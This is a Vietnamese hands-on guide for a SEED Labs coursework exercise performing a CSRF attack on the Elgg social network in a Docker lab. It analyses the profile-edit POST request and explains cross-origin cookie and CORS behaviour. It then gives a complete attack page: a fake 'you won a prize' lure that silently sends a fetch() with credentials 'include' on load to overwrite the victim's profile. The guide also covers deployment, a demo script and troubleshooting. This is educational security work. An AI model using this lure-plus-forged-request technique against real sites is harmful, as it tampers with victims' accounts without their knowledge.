# 02. HƯỚNG DẪN KỸ THUẬT THỰC HÀNH TẤN CÔNG CSRF BẰNG FETCH API

Tài liệu này cung cấp hướng dẫn kỹ thuật chi tiết từng bước (Step-by-Step Hands-on Guide) để thực hiện thành công bài tấn công CSRF trên nền tảng mạng xã hội Elgg theo đúng các ràng buộc nghiêm ngặt trong đề bài.

---

## 🛠️ 1. Chuẩn bị môi trường thực nghiệm (SEED Labs Environment)

### 1.1. Khởi động các container Docker
Trong máy ảo Ubuntu (SEEDUbuntu) hoặc máy Linux cá nhân đã cài đặt Docker & Docker Compose:

```bash
# 1. Di chuyển vào thư mục chứa mã nguồn phòng thí nghiệm SEED Labs CSRF
cd ~/Labsetup

# 2. Xây dựng và khởi động các container ở chế độ chạy ngầm (detached)
docker-compose up -d

# 3. Kiểm tra trạng thái các container đang chạy
docker ps --format "table {{.ID}}\t{{.Names}}\t{{.Status}}\t{{.Ports}}"
```

Hệ thống sẽ chạy 3 dịch vụ chính:
- **`seed-server` (10.9.0.5):** Máy chủ Apache chạy ứng dụng mạng xã hội Elgg tại tên miền `www.seed-server.com`.
- **`mysql` (10.9.0.6):** Cơ sở dữ liệu MySQL lưu trữ dữ liệu người dùng Elgg.
- **`attacker32` (10.9.0.7):** Máy chủ Apache của kẻ tấn công tại tên miền `www.attacker32.com`.

### 1.2. Cấu hình phân giải tên miền cục bộ (`/etc/hosts`)
Đảm bảo file `/etc/hosts` trên máy nạn nhân (máy thực hiện duyệt web) chứa các ánh xạ sau:

```text
10.9.0.5   www.seed-server.com
10.9.0.7   www.attacker32.com
10.9.0.8   www.example32.com
```

*(Lưu ý: Nếu chạy lab trực tiếp trên máy cục bộ với port mapping `localhost:8080`, ánh xạ tương ứng vào `127.0.0.1`).*

---

## 🔍 2. Bước 1: Phân tích HTTP POST Request qua DevTools

Để giả mạo thành công một request, kẻ tấn công phải hiểu rõ cấu trúc của request hợp lệ.

### Thao tác bắt gói tin:
1. Mở trình duyệt Firefox hoặc Chrome, truy cập: `http://www.seed-server.com`.
2. Đăng nhập tài khoản nạn nhân:
   - **Username:** `alice`
   - **Password:** `seedalice`
3. Nhấp vào ảnh đại diện hoặc chọn menu **Edit Profile** (đường dẫn: `http://www.seed-server.com/profile/alice/edit`).
4. Nhấn phím `F12` để mở **Developer Tools** $\rightarrow$ chọn tab **Network** (Mạng).
   - Tích chọn ô **Preserve log** (để giữ lại lịch sử request khi trang điều hướng).
5. Tại form chỉnh sửa hồ sơ, thay đổi một trường bất kỳ (ví dụ trường *Brief description* thành `Test Profile`) rồi bấm nút **Save**.
6. Tại tab Network, quan sát request gửi đi:
   - **Request URL:** `http://www.seed-server.com/action/profile/edit`
   - **Request Method:** `POST`
   - **Status Code:** `302 Found` (Server cập nhật xong và chuyển hướng về trang cá nhân).

### Phân tích chi tiết Header & Body:

#### A. Request Headers:
```http
POST /action/profile/edit HTTP/1.1
Host: www.seed-server.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) ...
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded
Cookie: Elgg=p0dci8baqrl4i2ipv2mio3po05; ...
Connection: keep-alive
```
> **Điểm quan trọng:** Trình duyệt tự động gửi kèm cookie `Elgg=...` chứa session ID hợp lệ của Alice.

#### B. Request Payload (Body):
Dữ liệu gửi lên được định dạng theo kiểu `application/x-www-form-urlencoded`:

| Tên tham số (Parameter) | Ý nghĩa | Giá trị mẫu |
| :--- | :--- | :--- |
| `__elgg_token` | Token chống CSRF của Elgg | `fc98784a9f...` *(trong Task 3 bài lab, cơ chế này đã được tắt)* |
| `__elgg_ts` | Timestamp phát sinh token | `1403464813` |
| `name` | Tên hiển thị người dùng | `Alice` |
| `description` | **Nội dung trường "About me"** | `<p>CSRF attack by <MSV></p>` |
| `accesslevel[description]` | Quyền xem trường About me | `2` *(2 = Public - Công khai; 1 = Logged in; 0 = Private)* |
| `briefdescription` | Mô tả ngắn gọn | `I am Alice` |
| `accesslevel[briefdescription]`| Quyền xem Brief description | `2` |
| `location` | Địa chỉ | `Hanoi` |
| `accesslevel[location]` | Quyền xem địa chỉ | `2` |
| `guid` | **ID định danh duy nhất của Alice** | `42` *(có thể xem qua source code trang cá nhân)* |

---

## ⚡ 3. Bước 2: Kỹ thuật cốt lõi: Tại sao Fetch API + URLSearchParams?

### 3.1. So sánh 3 phương pháp tấn công

| Tiêu chí | HTML Form Submit (`form.submit()`) | XMLHttpRequest (XHR) | **Fetch API (`fetch()`)** |
| :--- | :--- | :--- | :--- |
| **Bản chất** | Đồng bộ, điều hướng toàn trang | Bất đồng bộ cũ | **Bất đồng bộ hiện đại (Promise-based)** |
| **Tính tàng hình (Stealth)** | ❌ Rất kém (nạn nhân bị chuyển hướng sang Elgg ngay lập tức) | ✅ Chạy ngầm | ✅ **Tàng hình tuyệt đối (chạy ngầm hoàn toàn)** |
| **Độ phức tạp code** | Cần tạo DOM giả `<form>` và `<input>` | Khá rườm rà (`onreadystatechange`) | ✅ **Ngắn gọn, trực quan, hỗ trợ Async/Await** |
| **Độ tuân thủ yêu cầu đề bài** | ❌ **Bị cấm** | ❌ **Bị cấm** | ✅ **BẮT BUỘC SỬ DỤNG** |

### 3.2. Vấn đề Cookie qua Cross-Origin: `credentials: 'include'`
Theo chuẩn bảo mật hiện đại của WHATWG Fetch:
- Khi một trang web tại `http://www.attacker32.com` gọi `fetch()` tới domain khác là `http://www.seed-server.com`, trình duyệt mặc định đặt chế độ `credentials: 'same-origin'`. Nghĩa là **KHÔNG gửi kèm cookie của `seed-server.com`**.
- Nếu không có cookie, server Elgg coi đây là request của khách vãng lai chưa đăng nhập $\rightarrow$ **Tấn công thất bại!**
- Do đó, **bắt buộc** phải truyền tham số:
  ```javascript
  credentials: 'include'
  ```
  Tham số này yêu cầu trình duyệt tự động tìm và đính kèm mọi Cookie thuộc về `www.seed-server.com` vào request gửi đi.

### 3.3. Vấn đề CORS và `mode: 'no-cors'`
Nhiều sinh viên nhầm lẫn rằng: *"Nếu máy chủ Elgg không có header `Access-Control-Allow-Origin: *` thì Fetch API sẽ bị chặn và tấn công không thành công"*. **Điều này hoàn toàn sai lầm!**

#### Cơ chế Simple Request:
1. Khi dùng `URLSearchParams`, trình duyệt thiết lập `Content-Type: application/x-www-form-urlencoded;charset=UTF-8`.
2. Theo đặc tả W3C CORS, đây là một **Simple Request**. Trình duyệt **KHÔNG gửi Preflight `OPTIONS` request** mà gửi trực tiếp `POST` request kèm cookie tới Elgg.
3. **Tại máy chủ Elgg:** Máy chủ nhận request, trích xuất cookie session của Alice, xác thực thành công và thực hiện ghi đè nội dung trường "About me" vào cơ sở dữ liệu.
4. **Tại trình duyệt:** Khi Elgg trả về response (mã 302/200), trình duyệt kiểm tra thấy thiếu header CORS nên chặn mã JavaScript đọc nội dung response.
5. **Kết luận:** Mặc dù JavaScript không đọc được kết quả phản hồi, **hành động tấn công thay đổi dữ liệu trên máy chủ đã diễn ra thành công 100%!**
6. Thêm cờ `mode: 'no-cors'` giúp trình duyệt xử lý response ở dạng `opaque`, tránh phát sinh biệt lệ (unhandled promise rejection) trong Console.

---

## 💻 4. Bước 3: Lập trình trang web tấn công (`index.html`)

Dưới đây là mã nguồn chuẩn chỉnh của file `index.html` được thiết kế để đặt trên máy chủ `www.attacker32.com`.

```html
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chương trình quà tặng đặc biệt</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #333;
        }
        .card {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            text-align: center;
            max-width: 500px;
        }
        h1 { color: #e53e3e; margin-bottom: 10px; }
        p { font-size: 16px; line-height: 1.6; color: #4a5568; }
        .spinner {
            margin: 20px auto;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <h1>🎉 Chúc mừng bạn đã trúng thưởng!</h1>
        <p>Hệ thống đang chuẩn bị gói quà may mắn dành riêng cho tài khoản của bạn. Vui lòng giữ trình duyệt trong giây lát...</p>
        <div class="spinner"></div>
    </div>

    <script type="text/javascript">
        /**
         * KỊCH BẢN TẤN CÔNG CSRF SỬ DỤNG FETCH API
         * Mục tiêu: Thay đổi trường 'About me' (description) của Alice thành:
         * "CSRF attack by <MSV>"
         */
        function launchCSRFAttack() {
            const targetUrl = 'http://www.seed-server.com/action/profile/edit';
            const victimGuid = '42'; // GUID của Alice trong SEED Labs Elgg
            const victimName = 'Alice';
            const studentId = 'B21DCCN001'; // Thay bằng MSV thực tế của nhóm

            // 1. Sử dụng URLSearchParams để đóng gói dữ liệu application/x-www-form-urlencoded
            const payload = new URLSearchParams();
            payload.append('name', victimName);
            payload.append('description', `<p>CSRF attack by ${studentId}</p>`);
            payload.append('accesslevel[description]', '2'); // 2 = Public
            payload.append('briefdescription', 'Hacked via Fetch API CSRF!');
            payload.append('accesslevel[briefdescription]', '2');
            payload.append('guid', victimGuid);

            console.log('[*] Đang gửi payload CSRF bí mật qua Fetch API...');

            // 2. Kích hoạt Fetch API gửi ngầm request
            fetch(targetUrl, {
                method: 'POST',
                mode: 'no-cors',            // Bỏ qua preflight CORS, gửi Simple Request
                credentials: 'include',     // BẮT BUỘC: Đính kèm Cookie phiên của nạn nhân
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: payload
            })
            .then(() => {
                console.log('[+] Request CSRF đã được phóng thành công đến máy chủ mục tiêu!');
            })
            .catch((error) => {
                console.error('[-] Lỗi trong quá trình kích hoạt Fetch:', error);
            });
        }

        // Tự động kích hoạt tấn công ngay khi trang web tải xong
        window.addEventListener('DOMContentLoaded', launchCSRFAttack);
    </script>
</body>
</html>
```

---

## 🚀 5. Bước 4: Triển khai và Kiểm thử thực tế

### 5.1. Triển khai lên máy chủ Attacker
Trong môi trường SEED Labs:
```bash
# Copy file index.html vào thư mục web root của container attacker32
docker cp src/index.html attacker32-10.9.0.7:/var/www/attacker/index.html
```
*(Hoặc sử dụng script `python3 src/exploit.py --serve 80` để khởi tạo web server giả lập).*

### 5.2. Kịch bản thực hiện tấn công (Quay video demo)
1. **Bước 1 (Nạn nhân hoạt động bình thường):**
   - Mở trình duyệt, truy cập `http://www.seed-server.com`.
   - Đăng nhập tài khoản `alice` / `seedalice`.
   - Vào trang Profile của Alice, chỉ rõ trường **About me** hiện tại đang có nội dung ban đầu (hoặc trống).
2. **Bước 2 (Nạn nhân bị tấn công):**
   - Mở một tab mới trên cùng trình duyệt đó (để chia sẻ Cookie session).
   - Truy cập vào trang web độc hại của Attacker: `http://www.attacker32.com` (hoặc link do Attacker gửi qua tin nhắn/email).
   - Mở Console (F12) để chứng minh đoạn mã JavaScript `fetch()` đã tự động kích hoạt và gửi gói tin POST kèm Cookie ngầm.
3. **Bước 3 (Kiểm tra kết quả):**
   - Quay lại tab Elgg của Alice, nhấn `F5` (Refresh trang).
   - **Kết quả mong đợi:** Trường **About me** đã hiển thị nội dung:  
     $$\text{“CSRF attack by <MSV>”}$$
   - Hành động cập nhật diễn ra mà Alice hoàn toàn không hay biết và không hề có cảnh báo nào!

---

## ⚠️ 6. Các lỗi thường gặp (Troubleshooting) và Cách xử lý

1. **Lỗi: Profile của Alice không đổi sau khi vào trang web độc hại.**
   - *Nguyên nhân 1:* Quên khai báo `credentials: 'include'`. Trình duyệt không gửi cookie phiên của Elgg.
   - *Nguyên nhân 2:* Sai `guid`. GUID của Alice trong SEED Lab mặc định là `42`. Hãy kiểm tra URL ảnh đại diện hoặc mã nguồn HTML để xác nhận chính xác GUID.
   - *Nguyên nhân 3:* Cơ chế bảo vệ CSRF gốc của Elgg đang được BẬT. Cần kiểm tra file cấu hình Apache `/etc/apache2/sites-available/elgg.conf` để đảm bảo bài lab đang chạy ở cấu hình tắt bảo vệ (theo yêu cầu của Task 3).
2. **Lỗi: Trình duyệt báo `Cross-Origin Request Blocked`.**
   - *Giải thích:* Đây là cơ chế bảo vệ phía Client ngăn không cho JS đọc Response. Nếu bạn đã thêm `mode: 'no-cors'`, console sẽ không báo đỏ nữa. Quan trọng nhất là dữ liệu tại server vẫn được cập nhật bình thường.
